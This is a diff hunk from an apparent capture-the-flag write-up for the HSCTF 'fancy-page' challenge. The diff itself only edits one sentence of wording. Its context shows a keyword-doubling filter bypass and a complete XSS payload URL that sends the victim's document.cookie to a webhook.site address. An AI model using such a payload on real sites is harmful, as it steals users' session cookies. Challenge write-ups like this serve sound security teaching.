@@ -40,7 +40,7 @@ cookie => ""
 coocookiekie => "cookie"
 ```
 
-And here is the payload that I used to solve this chall
+And here is the payload I used to solve this chall
 
 ```
 http://fancy-page.hsctf.com/display.html?title=test&content=test%3Cimg/src/oonnerror%3Dlocatioonn.replace(%27https://webhook.site/bbd37165-3069-4602-8ffe-56a1c7e6a8a1%2F%3F%27%2Bdocument.coocookiekie)%3E&background_color=%23ffffff&color=%23000000&font=Helvetica&font_size=16
